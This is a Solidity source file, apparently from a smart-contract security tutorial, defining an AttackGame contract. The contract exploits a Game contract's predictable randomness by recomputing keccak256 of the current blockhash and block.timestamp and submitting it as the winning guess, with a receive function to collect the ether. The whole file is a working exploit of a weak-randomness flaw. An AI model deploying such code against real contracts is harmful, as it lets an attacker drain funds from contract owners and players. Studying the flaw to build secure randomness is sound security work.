//SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "./Game.sol";

contract AttackGame {
    Game game;
    /**
     * Creates an instance of Game contract with the help og gameAddress
     */
    constructor(address gameAddress) {
        game = Game(gameAddress);
    }

    /**
     * Attacks the `Game` contract by guessing the exact number
     * because blockhash and block.timestamp is accessible publicly
     */
    function attack() public {
        uint _guess = uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)));
        game.guess(_guess);
    }

    //called when the contract receives ether
    receive() external payable {}
}